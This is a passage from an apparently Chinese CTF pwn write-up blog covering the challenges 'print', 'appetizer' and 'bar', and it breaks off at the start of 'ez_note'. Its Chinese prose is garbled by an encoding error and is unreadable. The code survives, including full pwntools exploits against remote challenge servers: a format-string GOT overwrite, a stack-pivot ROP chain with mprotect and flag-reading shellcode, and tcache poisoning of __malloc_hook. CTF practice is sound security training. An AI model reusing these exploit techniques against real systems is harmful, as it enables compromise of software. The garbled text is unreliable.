æ­¤æ— æ³•åŠ«æŒexité‡Œçš„ç»“æ„ä½“æŒ‡é’ˆã€‚</p><p>å‘ç°printfæ‰§è¡Œåï¼Œæ‰§è¡Œäº†ä¸€ä¸ªputsï¼Œè€ƒè™‘å»åŠ«æŒIOé‡Œçš„æŸäº›æŒ‡é’ˆã€‚è€ƒè™‘å»ä¼ªé€ stdoutç»“æ„ä½“é‡Œçš„vtableæŒ‡é’ˆï¼Œæ§åˆ¶å…¶åç§»ï¼Œè®©__xsputnè½åœ¨one_gadgetä¸Šå³å¯ã€‚ä½†å®é™…æ“ä½œçš„æ—¶å€™å‘ç°vtableè¿™ä¸ªåŸºåœ°å€ä¸­å‡ºç°äº†0x78ï¼Œç»“æœå¯¼è‡´äº†ifåˆ¤æ–­æ—¶è¢«è¿‡æ»¤æ‰äº†ï¼Œå› æ­¤è¿™ä¸ªæ€è·¯ä¹Ÿæ–­äº†ã€‚</p><p>ç»è¿‡roderickå’Œwinmtå¸ˆå‚…çš„æç¤ºï¼Œè¿™é¢˜é‡‡ç”¨ä¸€ç§æ–°çš„æ€è·¯ï¼Œæ¥åŠ«æŒlibcä¸­çš„gotè¡¨ã€‚</p><p>æœ¬é¢˜çš„libcä¿æŠ¤å¦‚ä¸‹ï¼š</p><p><img src="/../img/2706180-20220919100457611-1949132916.png"></p><p>å¯ä»¥çœ‹è§ä¿æŠ¤æ˜¯Partial RELROï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ç¯¡æ”¹å…¶å‡½æ•°çš„gotè¡¨ã€‚</p><p>è€Œputså‡½æ•°åˆè°ƒç”¨äº†strlenå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯åœ¨libcä¸­æ‰§è¡Œputså‡½æ•°æ—¶ï¼Œåˆé€šè¿‡strlenå‡½æ•°çš„gotè¡¨è·³è½¬åˆ°äº†strlenå‡½æ•°ã€‚</p><p>æˆ‘ä»¬å»åŠ«æŒstrlenå‡½æ•°çš„gotè¡¨ä¸ºone_gadgetå³å¯ã€‚</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h3><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">toolsæºç </a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p,e,libc=load(<span class="string">&quot;print&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26047&quot;</span>)</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,0x13A0,0x13E9)</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Your name?pls..\n&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">leak_libc=recv_libc()</span><br><span class="line">libc_base=leak_libc-<span class="number">0x1ec5c0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">strlen_addr=libc_base+<span class="number">0x1EB0A8</span><span class="comment">#libcä¸­strlenå‡½æ•°çš„gotè¡¨åœ°å€</span></span><br><span class="line">one_gadget=search_og(<span class="number">1</span>)+libc_base</span><br><span class="line">log_addr(<span class="string">&#x27;one_gadget&#x27;</span>)</span><br><span class="line">payload=fmtstr_payload(offset=<span class="number">8</span>,writes=&#123;strlen_addr:one_gadget&#125;,numbwritten=<span class="number">0</span>, write_size=<span class="string">&#x27;byte&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;But there is sth wrong in it,so you can&#x27;t do sth&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../img/image-20221007232808150.png" alt="image-20221007232808150"></p><h2 id="appetizer"><a href="#appetizer" class="headerlink" title="appetizer"></a>appetizer</h2><h3 id="ä¿æŠ¤ç­–ç•¥ï¼š-1"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š-1" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h3><p><img src="/../img/image-20221007232818671.png" alt="image-20221007232818671"></p><h3 id="æ¼æ´æ‰€åœ¨ï¼š-1"><a href="#æ¼æ´æ‰€åœ¨ï¼š-1" class="headerlink" title="æ¼æ´æ‰€åœ¨ï¼š"></a>æ¼æ´æ‰€åœ¨ï¼š</h3><p><img src="/../img/image-20221007232830424.png" alt="image-20221007232830424"></p><p>è¿™é‡Œå­˜åœ¨ä¸€ä¸ªæº¢å‡ºï¼Œè™½ç„¶ä¸ä¼šæº¢å‡ºåˆ°è¿”å›åœ°å€ï¼Œä½†æ˜¯åå…«ä¸ªå­—èŠ‚å†³å®šäº†ä¸‹å›¾readæ˜¯å¾€å“ªé‡Œè¾“å…¥çš„ã€‚</p><p><img src="/../img/image-20221007232842582.png" alt="image-20221007232842582"></p><p><img src="/../img/image-20221007232853757.png" alt="image-20221007232853757"></p><p>ä¸Šå›¾è¿™é‡Œæ³„éœ²äº†ä¸€ä¸ªåœ°å€ï¼Œé€šè¿‡è¿™ä¸ªæˆ‘ä»¬å¯ä»¥æ‹¿åˆ°ç¨‹åºåŸºåœ°å€ï¼Œè€Œä¸”è¿™ä¸ªåœ°å€ä¹Ÿæ˜¯æ¥ä¸‹æ¥readå¾€é‡Œé¢è¾“å…¥äº†0x108å­—èŠ‚çš„åœ°å€ã€‚</p><h3 id="åˆ©ç”¨æ€è·¯ï¼š-1"><a href="#åˆ©ç”¨æ€è·¯ï¼š-1" class="headerlink" title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h3><p>å…¶å®è¿™é“é¢˜çš„æ„å›¾å¾ˆæ˜æ˜¾ï¼Œå‡ºé¢˜äººåº”è¯¥æ˜¯æƒ³è®©æˆ‘ä»¬è¿ç§»åˆ°è¿™é‡Œ(å¦‚ä¸‹å›¾)ï¼Œå› ä¸ºè¿™é‡Œæˆ‘ä»¬æ˜¯å¯ä»¥æŠŠropé“¾å¸ƒç½®åˆ°è¿™é‡Œçš„ã€‚</p><p><img src="/../img/image-20221007232903914.png" alt="image-20221007232903914"></p><p>ç„¶åå»æ‰“ropï¼ŒåŒæ—¶å› ä¸ºç¦ç”¨äº†execveï¼Œå› æ­¤æœ€ç»ˆåº”è¯¥æ˜¯è€ƒè™‘æ‰“orwã€‚</p><p>æˆ‘ä»¬å…ˆçœ‹çœ‹å¦‚ä½•è¿ç§»åˆ°è¿™ä¸ªåœ°å€ä¸Šã€‚</p><p>é¦–å…ˆé€šè¿‡è°ƒè¯•ï¼Œæˆ‘ä»¬å‘ç°å¦‚æœæˆ‘ä»¬åœ¨ç¬¬ä¸€æ¬¡è¾“å…¥é‡Œï¼Œæœ€åçš„å­—èŠ‚å‘8ä¸ªaï¼Œé‚£ä¹ˆæœ€åä¸€æ¬¡çš„readçš„bufå°±ä¼šå˜æˆä¸€å †a(å¦‚ä¸‹)</p><p><img src="/../img/image-20221007232953300.png" alt="image-20221007232953300"></p><p>è¿™ä¸ªåœ°å€è¡¨é¢ä¸Šæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œä½†æ˜¯æˆ‘ä»¬æ²¡æœ‰æ ˆåœ°å€ï¼Œå› æ­¤å…¶å®æ˜¯æ§åˆ¶ä¸äº†ç¨‹åºçš„æ‰§è¡Œæµçš„ã€‚ä¸è¿‡è¿™é‡Œæˆ‘è§‚å¯Ÿäº†ä¸€ä¸‹ï¼Œè¿™ä¸ªreadçš„bufæ­£å¸¸çš„å€¼(ä¹Ÿå°±æ˜¯ä¸åˆ©ç”¨ç¬¬ä¸€æ¬¡è¾“å…¥çš„é‚£ä¸ªæº¢å‡º)(å¦‚ä¸‹)å°±æ˜¯rbpï¼Œè€Œæ­£å¥½å¯ä»¥æ§åˆ¶rbpçš„å€¼å’Œè¿”å›åœ°å€(è¿™ä¹Ÿå°±æ˜¯æˆ‘ä»¬æ‰“æ ˆè¿ç§»çš„æ¡ä»¶)</p><p><img src="/../img/image-20221007233119819.png" alt="image-20221007233119819"></p><h4 id="ropé“¾çš„æ„å»º"><a href="#ropé“¾çš„æ„å»º" class="headerlink" title="ropé“¾çš„æ„å»º"></a>ropé“¾çš„æ„å»º</h4><p>ç„¶åæˆ‘ä»¬é‚£è¾¹çš„ropé“¾çš„æ€è·¯æ˜¯å…ˆæ³„éœ²libcåœ°å€ï¼Œç„¶åå†æ‰§è¡Œä¸€æ¬¡readè¯»è¿›æ¥ä¸€æ¡æ–°çš„ropé“¾æ¥æ‰“orwã€‚ä½†éš¾ç‚¹æ˜¯æˆ‘ä»¬æ— æ³•æ§åˆ¶rdxå¯„å­˜å™¨ï¼Œå¯¼è‡´readå‡½æ•°ç”¨æ®‹ç•™çš„rdxä¸­æ•°æ®ç›´æ¥è¯»çš„è¯ï¼Œåªèƒ½è¯»è¿›æ¥16ä¸ªå­—èŠ‚çš„æ•°æ®ã€‚(è€Œè¿™æ–°è¯»çš„16ä¸ªå­—èŠ‚æ•°æ®ï¼Œå°±å¯ä»¥ä½¿ç”¨libcé‡Œçš„gadgetåœ°å€äº†)ï¼Œå› æ­¤æˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªlibcé‡Œçš„pop rdxçš„gadgetå†æ‰§è¡Œä¸€æ¬¡readå‡½æ•°ï¼Œæ¥è¯»å…¥æ›´å¤šçš„æ•°æ®ã€‚</p><p>å…ˆè¯´ç¬¬ä¸€æ¡é“¾çš„ç¬¬ä¸€éƒ¨åˆ†ï¼ˆä½¿ç”¨writeå‡½æ•°è¿›è¡Œlibcåœ°å€çš„æ³„éœ²ï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œä¸çŸ¥é“ä¸ºå•¥æˆ‘è¿™é‡Œç”¨putsæ³„éœ²ä¸äº†ï¼‰</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">rop=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(e.got[<span class="string">&#x27;write&#x27;</span>]+base_addr)+p64(<span class="number">0</span>)+p64(e.plt[<span class="string">&#x27;write&#x27;</span>]+base_addr)</span><br></pre></td></tr></table></figure><p><img src="/../img/image-20221007233132958.png" alt="image-20221007233132958"></p><p>å†è¯´ç¬¬ä¸€æ¡é“¾çš„ç¬¬äºŒéƒ¨åˆ†ï¼ˆè¿™ä¸ªéƒ¨åˆ†çš„æ„ä¹‰å°±æ˜¯æŠŠlibcé‡Œè¿™ä¸ªpop rdxçš„gadgetç»™è¯»åˆ°å†…å­˜é‡Œæ¥ï¼Œè¿™é‡Œreadå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°éœ€è¦å¸ƒå±€ä¸€ä¸‹ï¼‰ï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">rop+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(base_addr+<span class="number">0x40d8</span>)+p64(<span class="number">0</span>)+p64(e.plt[<span class="string">&#x27;read&#x27;</span>]+base_addr)</span><br></pre></td></tr></table></figure><p>é€šè¿‡å¯¹æ¯”ä¸‹é¢ä¸¤å¹…å›¾ï¼Œå°±å¯ä»¥å‘ç°è¾“å…¥å‰åï¼Œå°±æŠŠ0xdeadbeefç»™è¦†ç›–æˆäº†pop_rdx_r12</p><p><img src="/../img/image-20221007233216868.png" alt="image-20221007233216868"></p><p><img src="/../img/image-20221007233231650.png" alt="image-20221007233231650"></p><p>æœ€åç¬¬ä¸€æ¡é“¾çš„ç¬¬ä¸‰éƒ¨åˆ†ï¼ˆè¿™éƒ¨åˆ†æ˜¯æå‰å†™å¥½readçš„ç¬¬ä¸€å‚æ•°å’Œç¬¬äºŒä¸ªå‚æ•°ï¼Œä½†æ˜¯ç¬¬ä¸‰ä¸ªå‚æ•°çš„ä½ç½®ï¼Œæˆ‘ç”¨äº†0xdeadbeefæ¥å ä½ï¼Œå› ä¸ºåœ¨è¿™æ¡é“¾çš„ç¬¬äºŒéƒ¨åˆ†ï¼Œreadå‡½æ•°å°±å°†å‰ä¸¤ä¸ª0xdeadbeefè¦†ç›–æˆäº†pop_rdx_r12å’Œ0ï¼Œè¿™æ ·ç¬¬ä¸‰æ¡é“¾å®é™…ä¸Šå°±æ˜¯æ­£å¸¸çš„äº†(ç¬¬ä¸‰ä¸ª0xdeadbeefæ— æ‰€è°“äº†ï¼Œåæ­£ä¼šè¢«å¼¹åˆ°r12å¯„å­˜å™¨é‡Œ)ï¼‰</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">rop+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(base_addr+<span class="number">0x40f8</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0xdeadbeef</span>)*<span class="number">3</span>+p64(e.plt[<span class="string">&#x27;read&#x27;</span>]+base_addr)</span><br></pre></td></tr></table></figure><p>è€Œæ‰§è¡Œå®Œç¬¬ä¸€æ¡é“¾åï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨ä½¿ç”¨libcä¸­ä»»æ„gadgetçš„å‰æä¸‹å†™å…¥æ–°çš„ropé“¾ã€‚(å¦‚ä¸‹å›¾)<br><img src="/../img/image-20221007233251071.png" alt="image-20221007233251071"></p><p>ä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘å…ˆå»åˆ©ç”¨gadgetä¼ å‚ä¸”æ‰§è¡Œäº†mprotectå‡½æ•°ï¼Œå°†è¿™ä¸ªå†…å­˜é¡µç›´æ¥å˜æˆå¯è¯»å¯å†™å¯æ‰§è¡Œäº†ï¼Œæœ€åè·Ÿäº†ä¸ªorwçš„shellcode(æœ€åorwè¿™é‡Œæœ‰ä¸ªå‘ï¼Œæ‰“è¿œç¨‹ä¸çŸ¥é“ä¸ºå•¥ï¼Œæ­£å¸¸çš„orwåœ¨è¿œç¨‹è¯»ä¸å‡ºæ¥flagï¼Œè€Œæœ¬åœ°å¯ä»¥è¯»å‡ºæ¥ã€‚è¿™é‡Œå¿…é¡»è¦å…ˆclose(0)ï¼Œç„¶åå†å»æ‰“å¼€flagæ–‡ä»¶ï¼Œç„¶åreadä»æ–‡ä»¶æè¿°ç¬¦0é‡Œè¯»æ•°æ®æ‰è¡Œï¼‰</p><p>è°ƒè¯•è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p><img src="/../img/image-20221007233305866.png" alt="image-20221007233305866"></p><p>ç„¶åå…ˆç”¨closeæŠŠæ ‡å‡†è¾“å…¥ç»™å…³äº†ï¼Œå†æ‰“orwå³å¯æ‹¿åˆ°flag</p><p><img src="/../img/image-20221007233317473.png" alt="image-20221007233317473"></p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h3><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">toolsæºç </a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p,e,libc=load(<span class="string">&quot;app&quot;</span>,<span class="string">&quot;node4.buuoj.cn:29916&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,0x1464)</span></span><br><span class="line">payload=<span class="string">&quot;\x00\x00Nameless&quot;</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Let&#x27;s check your identity\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Here you are:&#x27;</span>)</span><br><span class="line">leak_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">base_addr=leak_addr-<span class="number">0x4050</span></span><br><span class="line">log_addr(<span class="string">&#x27;base_addr&#x27;</span>)</span><br><span class="line">pop_rsp_r13_r14_r15=<span class="number">0x00000000000014cd</span>+base_addr</span><br><span class="line">pop_rdi=<span class="number">0x00000000000014d3</span>+base_addr</span><br><span class="line">pop_rsi_r15=base_addr+<span class="number">0x00000000000014d1</span></span><br><span class="line">leave=base_addr+<span class="number">0x00000000000012d8</span></span><br><span class="line">rop=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(e.got[<span class="string">&#x27;write&#x27;</span>]+base_addr)+p64(<span class="number">0</span>)+p64(e.plt[<span class="string">&#x27;write&#x27;</span>]+base_addr)</span><br><span class="line">rop+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(base_addr+<span class="number">0x40d8</span>)+p64(<span class="number">0</span>)+p64(e.plt[<span class="string">&#x27;read&#x27;</span>]+base_addr)</span><br><span class="line">rop+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(base_addr+<span class="number">0x40f8</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0xdeadbeef</span>)*<span class="number">3</span>+p64(e.plt[<span class="string">&#x27;read&#x27;</span>]+base_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;And pls write your own information on it\n&quot;</span>,rop)</span><br><span class="line">p.sendafter(<span class="string">&quot;Tell me your wish:\n&quot;</span>,p64(leak_addr-<span class="number">8</span>)+p64(leave))</span><br><span class="line">leak_libc=recv_libc()</span><br><span class="line">libc_base=leak_libc-<span class="number">0x111040</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">pop_rsi=<span class="number">0x0000000000027529</span>+libc_base</span><br><span class="line">pop_rdx_r12=<span class="number">0x11c1e1</span>+libc_base</span><br><span class="line">pop_rax=libc_base+<span class="number">0x4a550</span></span><br><span class="line">syscall=<span class="number">0x000000000002584d</span>+libc_base</span><br><span class="line">mprotect=<span class="number">0x000000000011b970</span>+libc_base</span><br><span class="line">rop=p64(pop_rdx_r12)+p64(<span class="number">0x1000</span>)</span><br><span class="line">p.send(rop)</span><br><span class="line">pause()</span><br><span class="line">rop=p64(pop_rdi)+p64(leak_addr-<span class="number">0x50</span>)+p64(pop_rsi)+p64(<span class="number">0x1000</span>)+p64(pop_rdx_r12)+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">10</span>)+p64(mprotect)+p64(base_addr+<span class="number">0x4150</span>)</span><br><span class="line">rop+=<span class="string">b&quot;\x48\xC7\xC0\x03\x00\x00\x00\x48\xC7\xC7\x00\x00\x00\x00\x0F\x05\x49\xB8\x2F\x66\x6C\x61\x67\x00\x00\x00\x41\x50\x54\x5F\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x50\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05&quot;</span></span><br><span class="line">p.sendline(rop)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../img/image-20221007233330115.png" alt="image-20221007233330115"></p><h2 id="bar"><a href="#bar" class="headerlink" title="bar"></a>bar</h2><h3 id="ä¿æŠ¤ç­–ç•¥ï¼š-2"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š-2" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h3><p><img src="/../img/image-20221007233338793.png" alt="image-20221007233338793"></p><h3 id="æ¼æ´æ‰€åœ¨ï¼š-2"><a href="#æ¼æ´æ‰€åœ¨ï¼š-2" class="headerlink" title="æ¼æ´æ‰€åœ¨ï¼š"></a>æ¼æ´æ‰€åœ¨ï¼š</h3><p>é¦–å…ˆåœ¨showå‡½æ•°é‡Œç¨‹åºè‡ªå·±æ³„éœ²äº†ä¸€ä¸ªlibcåœ°å€ã€‚</p><p><img src="/../img/image-20221007233346476.png" alt="image-20221007233346476"></p><p>å­˜åœ¨UAFæ¼æ´ï¼š</p><p><img src="/../img/image-20221007233356927.png" alt="image-20221007233356927"></p><p>ç„¶ååœ¨ç”³è¯·å †å—ä¹‹åå†™å…¥æ•°æ®æ—¶ä¼šåœ¨ç”¨æˆ·åŒºç¬¬ä¸‰ä¸ªå†…å­˜å•å…ƒå¼€å§‹è¾“å…¥æ•°æ®(ç¬¬ä¸€ä¸ªå†…å­˜å•å…ƒç”¨äºå­˜å‚¨ä¸€ä¸ªsize(å¦‚ä¸‹)ï¼Œç¬¬äºŒä¸ªå†…å­˜å•å…ƒæ˜¯ç©ºçš„)ï¼Œä½†æ˜¯è¾“å…¥çš„æ•°æ®ä¾ç„¶æ˜¯mallocç”³è¯·çš„sizeï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥æº¢å‡ºä¸‹ä¸€ä¸ªå†…å­˜å•å…ƒçš„prev_sizeå’Œsizeä½</p><p><img src="/../img/image-20221007233404888.png" alt="image-20221007233404888"></p><p><strong>è€Œåœ¨deleteå‡½æ•°ä¸­æˆ‘ä»¬å¯ä»¥æ§åˆ¶è®°å½•å †å—çš„é‚£ä¸ªsize(å¦‚ä¸‹)ï¼Œä½†æ°å·§è¿™ä¸ªä½ç½®æ˜¯å¤„äºfreeçŠ¶æ€çš„å †å—çš„fdæŒ‡é’ˆ(è¿™ä¹Ÿæ˜¯è¿™é“é¢˜çš„æ ¸å¿ƒåˆ©ç”¨ç‚¹)ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œç¯¡æ”¹å †å—çš„fdæŒ‡é’ˆ</strong></p><p><img src="/../img/image-20221007233412071.png" alt="image-20221007233412071"></p><h3 id="åˆ©ç”¨æ€è·¯ï¼š-2"><a href="#åˆ©ç”¨æ€è·¯ï¼š-2" class="headerlink" title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h3><p>æœ¬é¢˜æˆ‘ä»¬å¯ä»¥æ§åˆ¶è¢«é‡Šæ”¾æ‰å †å—çš„fdæŒ‡é’ˆï¼ŒåŒæ—¶è¿˜æœ‰libcåœ°å€ï¼Œé‚£å°±å¯ä»¥ç›´æ¥æ‰“tcache poisoningã€‚</p><p>æˆ‘ä»¬å…ˆç”³è¯·å››ä¸ªå †å—ï¼Œåˆ†åˆ«ä¸ºchunk1ã€chunk2ã€chunk3ã€chunk4ï¼ˆéƒ½ç”³è¯·sizeä¸º0x50å³å¯ï¼‰</p><p>åœ¨chunk3ä¸­å­˜å…¥malloc_hook-0x10çš„åœ°å€</p><p>ç„¶åæˆ‘ä»¬å†å°†å…¶å…¨éƒ¨é‡Šæ”¾æ‰ï¼Œè¿›å…¥tcache binã€‚<strong>æˆ‘ä»¬å»ä¿®æ”¹ä¸€ä¸‹chunk2çš„fdæŒ‡é’ˆè®©å…¶ä¸æŒ‡å‘chunk3çš„åœ°å€è€Œå»æŒ‡å‘chunk3ä¸­å­˜æ”¾çš„malloc_hook-0x10å¤„ï¼Œå¦‚æ­¤å°±åŠ«æŒäº†tcache binçš„è¿™æ¡é“¾ï¼Œæœ€åç”³è¯·å‡ºæ¥åœ¨malloc_hookä¸Šå†™ä¸€ä¸ªone_gadgetçš„åœ°å€å³å¯ã€‚</strong></p><p>è°ƒè¯•è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p><img src="/../img/image-20221007233430592.png" alt="image-20221007233430592"></p><p><img src="/../img/image-20221007233448315.png" alt="image-20221007233448315"></p><p>ä¸ºä»€ä¹ˆå½“æ—¶æ‰“tcache poisoningçš„æ—¶å€™ï¼Œéœ€è¦è®©malloc_hookçš„åœ°å€-0x10ï¼ˆåŸå› å¦‚ä¸‹ï¼‰ï¼Œ<strong>å› ä¸ºæ•°æ®æ˜¯ä»ç”¨æˆ·åŒº+0x10çš„ä½ç½®å¼€å§‹å†™å…¥çš„ï¼Œå› æ­¤ç”³è¯·çš„æ—¶å€™éœ€è¦æå‰-0x10.</strong></p><p><img src="/../img/image-20221007233458822.png" alt="image-20221007233458822"></p><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP:"></a>EXP:</h3><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">toolsæºç </a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">d_d=<span class="number">0x16D5</span></span><br><span class="line">d_a=<span class="number">0x16C1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">wine,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Whisky , brandy or Vodka?&quot;</span>, <span class="built_in">str</span>(wine))</span><br><span class="line">    p.sendafter(<span class="string">&quot;You may want to tell sth to the waiter:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx,size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Which?&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;How much?&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;We will give everyone only one cup of icecream!\n&quot;</span>)</span><br><span class="line">leak_libc_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">libc_base=leak_libc_addr-libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]<span class="comment">#-0x1ed6a0+0x1000 #</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">one_gadget=libc_base+search_og(<span class="number">1</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;one_gadget&#x27;</span>)</span><br><span class="line">malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,p64(malloc_hook-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>,<span class="number">0x50</span>)</span><br><span class="line">delete(<span class="number">1</span>,<span class="number">0x50</span>)</span><br><span class="line">delete(<span class="number">2</span>,<span class="number">0x50</span>)</span><br><span class="line">delete(<span class="number">3</span>,<span class="number">0x50</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_d,d_a)</span><br><span class="line">delete(<span class="number">2</span>,-<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,d_d,d_a)</span></span><br><span class="line">add(<span class="number">1</span>,p64(one_gadget))</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../img/image-20221007233511947.png" alt="image-20221007233511947"></p><h2 id="ez-note"><a href="#ez-note" class="headerlink" title="ez_note"></a>ez_note</h2><h3 id="ä¿æŠ¤ç­–ç•¥ï¼š-3"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š-3" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h3><p><img src="/../img/image-20221007233524690.png" alt="image-20221007233524690"></p><h3 id="æ¼æ´æ‰€åœ¨ï¼š-3"><a href="#æ¼æ´æ‰€åœ¨ï¼š-3" class="headerlink" title="æ¼æ´æ‰€åœ¨ï¼š"></a>æ¼æ´æ‰€åœ¨ï¼š</h3><p>åœ¨addå‡½æ•°é‡Œçš„è¾“å…¥å‡½æ•°ä¸­ï¼Œæœ€åç”¨atolå‡½æ•°å¯¹bufåšäº†å¤„ç†(å¦‚ä¸‹å›¾)</p><p><img src="/../img/image-20221007233539574.png" alt="image-20221007233539574"></p><p>è€Œatolå‡½æ•°æ˜¯å°†å­—ç¬¦ä¸²è½¬æ¢æˆä¸€ä¸ªé•¿æ•´æ•°(long intç±»å‹)ï¼Œè·Ÿè¿™ä¸ªå‡½æ•°å¾ˆåƒçš„è¿˜æœ‰ä¸€ä¸ªatoiå‡½æ•°ï¼Œè¯¥å‡½æ•°æ˜¯å°†å­—ç¬¦ä¸²è½¬æ¢æˆä¸€ä¸ªæ•´æ•°(intç±»å‹)ï¼Œå¤šäºäº†<a 